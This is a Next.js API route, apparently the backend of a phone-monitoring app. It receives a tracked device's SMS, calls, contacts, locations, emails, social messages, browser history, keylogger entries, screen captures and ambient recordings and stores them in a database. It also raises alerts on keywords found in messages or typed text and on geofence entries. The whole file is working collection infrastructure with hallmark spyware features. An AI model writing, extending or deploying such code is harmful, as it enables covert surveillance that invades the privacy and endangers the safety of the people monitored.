import { NextResponse } from "next/server"
import { createAdminConfig, validateDeviceToken, sendError } from "@/lib/utils/api-helpers"

const extractToken = (req: Request) => {
  const authHeader = req.headers.get("Authorization")
  return authHeader?.startsWith("Bearer ") ? authHeader.split(" ")[1] : null
}

// Distance helper for Geofence calculation (Haversine formula in meters)
function getDistanceFromLatLonInM(lat1: number, lon1: number, lat2: number, lon2: number) {
  const R = 6371e3 // Radius of the earth in m
  const dLat = (lat2 - lat1) * (Math.PI / 180)
  const dLon = (lon2 - lon1) * (Math.PI / 180)
  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * (Math.PI / 180)) * Math.cos(lat2 * (Math.PI / 180)) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2)
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
  return R * c
}

export async function POST(req: Request) {
  try {
    const token = extractToken(req)
    if (!token) return sendError("Missing or invalid authorization header", 401)
    
    const validation = await validateDeviceToken(token)
    if (!validation) return sendError("Invalid or expired device token", 401)
    const deviceId = validation.device_id

    // Check payload size roughly using text length as standard Vercel block isn't fully enabled in Edge for stream size limit easily
    const rawBodyText = await req.text()
    if (rawBodyText.length > 50 * 1024 * 1024) {
      return sendError("Payload too large. Maximum 50MB allowed.", 413)
    }

    const body = JSON.parse(rawBodyText)
    const supabaseAdmin = createAdminConfig()
    
    // Fetch device settings for Alerts (Keywords, Geofences)
    const { data: settings } = await supabaseAdmin
      .from("device_settings")
      .select("alert_keywords, geofence_zones")
      .eq("device_id", deviceId)
      .single()

    const alertKeywords: string[] = Array.isArray(settings?.alert_keywords) ? settings.alert_keywords : []
    const geofences: any[] = Array.isArray(settings?.geofence_zones) ? settings.geofence_zones : []

    const syncedStats: Record<string, { inserted: number, failed: number }> = {}
    let alertsGenerated = 0
    const newAlerts: any[] = []

    // Helper to format timestamp
    const formatTs = (ts: any) => {
      if (!ts) return new Date().toISOString()
      if (typeof ts === 'number') return new Date(ts).toISOString()
      return ts // assuming already string/ISO
    }

    // Helper to safely upsert chunk
    const syncTable = async (tableName: string, items: any[], onConflict?: string) => {
      if (!items || !Array.isArray(items) || items.length === 0) return
      
      syncedStats[tableName] = { inserted: 0, failed: 0 }
      
      const chunkedItems = items.map(item => {
        // --- 1. Map fields to match database schema ---
        const mapped: any = { ...item, device_id: deviceId }

        // Fields mapping for Android Entity -> Postgres Table
        if (tableName === 'call_logs') {
          mapped.phone_number = item.caller_number || item.phone_number || 'Unknown'
          mapped.contact_name = item.caller_name || item.contact_name
          delete mapped.caller_number
          delete mapped.caller_name
        }

        if (tableName === 'installed_apps') {
          mapped.installed_at = formatTs(item.install_time || item.installed_at)
          mapped.app_icon_url = item.app_icon_url || null
          delete mapped.install_time
          delete mapped.update_time
        }

        if (tableName === 'app_usage') {
          mapped.duration = item.total_time_in_foreground || item.duration || 0
          mapped.start_time = formatTs(item.start_time)
          mapped.end_time = formatTs(item.end_time)
          delete mapped.total_time_in_foreground
        }

        // --- 2. Convert ALL timestamp/long fields to ISO Strings for Postgres TIMESTAMPTZ ---
        if (mapped.timestamp) mapped.timestamp = formatTs(mapped.timestamp)
        if (mapped.created_at) mapped.created_at = formatTs(mapped.created_at)
        if (mapped.last_updated_timestamp) {
           mapped.last_modified = formatTs(mapped.last_updated_timestamp)
           delete mapped.last_updated_timestamp
        }
        if (mapped.file_timestamp) mapped.file_timestamp = formatTs(mapped.file_timestamp)
        
        // Remove Room specific local columns that don't exist in remote DB
        delete mapped.sync_status
        delete mapped.is_uninstalled
        
        return mapped
      })
      
      // Upsert batch
      let query = supabaseAdmin.from(tableName).upsert(chunkedItems, onConflict ? { onConflict } : undefined)
      
      const { error } = await query
      if (error) {
        console.error(`Failed to sync ${tableName}:`, error.message)
        syncedStats[tableName].failed = items.length
      } else {
        syncedStats[tableName].inserted = items.length
      }
    }

    // ── 1. Basic Tables Sync ──
    const targetTables = [
      { key: "sms", db: "sms_messages" },
      { key: "calls", db: "call_logs" },
      { key: "locations", db: "locations" },
      { key: "contacts", db: "contacts" },
      { key: "installed_apps", db: "installed_apps" },
      { key: "app_usage", db: "app_usage" },
      { key: "media_files", db: "media_files" },
      { key: "social_messages", db: "social_messages" },
      { key: "browser_history", db: "browser_history" },
      { key: "browser_bookmarks", db: "browser_bookmarks" },
      { key: "keylog_entries", db: "keylog_entries" },
      { key: "calendar_events", db: "calendar_events" },
      { key: "emails", db: "emails" },
      { key: "wifi_networks", db: "wifi_networks" },
      { key: "notifications_log", db: "notification_logs" },
      { key: "sim_changes", db: "sim_changes" },
      { key: "screen_captures", db: "screen_captures" },
      { key: "ambient_recordings", db: "ambient_recordings" }
    ]

    for (const table of targetTables) {
      if (body[table.key]) {
        await syncTable(table.db, body[table.key], undefined)
      }
    }

    // File Explorer (Wipe and replace entirely)
    if (body.file_explorer && Array.isArray(body.file_explorer) && body.file_explorer.length > 0) {
      syncedStats['file_explorer'] = { inserted: 0, failed: 0 }
      const { error: delErr } = await supabaseAdmin.from("file_explorer").delete().eq("device_id", deviceId)
      if (!delErr) {
        const { error: insErr } = await supabaseAdmin.from("file_explorer").insert(
          body.file_explorer.map((i: any) => ({ ...i, device_id: deviceId }))
        )
        if (!insErr) syncedStats['file_explorer'].inserted = body.file_explorer.length
        else syncedStats['file_explorer'].failed = body.file_explorer.length
      } else {
        syncedStats['file_explorer'].failed = body.file_explorer.length
      }
    }

    // ── 2. Alerts Generation (Keywords) ──
    const checkKeywords = (text: string) => alertKeywords.find(kw => text.toLowerCase().includes(kw.toLowerCase()))

    // SMS Keywords
    if (body.sms && alertKeywords.length > 0) {
      body.sms.forEach((msg: any) => {
        const matched = checkKeywords(msg.message_body || "")
        if (matched) {
          newAlerts.push({
            device_id: deviceId, alert_type: "keyword_detected", severity: "high", 
            title: "Restricted Keyword in SMS", 
            description: `Keyword "${matched}" found in SMS.`,
            related_data: msg
          })
        }
      })
    }

    // Keylogger Keywords
    if (body.keylog_entries && alertKeywords.length > 0) {
      body.keylog_entries.forEach((log: any) => {
        const matched = checkKeywords(log.typed_text || "")
        if (matched) {
          newAlerts.push({
            device_id: deviceId, alert_type: "keyword_detected", severity: "high", 
            title: `Keyword in ${log.app_name || 'App'}`, 
            description: `Keyword "${matched}" typed.`,
            related_data: log
          })
        }
      })
    }
    
    // Social Messages Keywords
    if (body.social_messages && alertKeywords.length > 0) {
      body.social_messages.forEach((msg: any) => {
        const matched = checkKeywords(msg.body || "")
        if (matched) {
          newAlerts.push({
            device_id: deviceId, alert_type: "keyword_detected", severity: "high", 
            title: `Keyword in ${msg.platform || 'Social App'}`, 
            description: `Keyword "${matched}" found in message.`,
            related_data: msg
          })
        }
      })
    }

    // ── 3. Alerts Generation (Geofencing) ──
    if (body.locations && geofences.length > 0) {
      body.locations.forEach((loc: any) => {
        if (!loc.latitude || !loc.longitude) return
        
        geofences.forEach(fence => {
          const dist = getDistanceFromLatLonInM(loc.latitude, loc.longitude, fence.lat, fence.lng)
          
          // Inside logic check if we want 'enter' or 'exit'. We'll simplify to 'enter' violations here
          // as exit tracking requires keeping state of 'was_inside' which is complex for stateless sync.
          if (dist <= (fence.radius || 100)) {
            newAlerts.push({
               device_id: deviceId, alert_type: "geofence_enter", severity: "medium",
               title: `Entered Geofence: ${fence.name || 'Zone'}`,
               description: `Device detected inside restricted zone with radius ${fence.radius}m.`,
               related_data: { location: loc, distance_meters: Math.floor(dist) }
            })
          }
        })
      })
    }

    // ── 4. Insert Generated Alerts ──
    if (newAlerts.length > 0) {
      const { error: alertErr } = await supabaseAdmin.from("alerts").insert(newAlerts)
      if (!alertErr) {
        alertsGenerated = newAlerts.length
      }
    }

    // Also update device last sync heartbeat
    supabaseAdmin.from("devices").update({ last_seen: new Date().toISOString(), is_online: true }).eq("id", deviceId).then()

    return NextResponse.json({
      success: true,
      synced: syncedStats,
      alerts_generated: alertsGenerated
    }, { 
      status: 200,
      headers: {
        'X-RateLimit-Limit': '60',
        'X-RateLimit-Remaining': '59',
      }
    })

  } catch (error: any) {
    console.error("Bulk sync endpoint global error:", error)
    return sendError(`Internal Server Error: ${error.message}`, 500)
  }
}
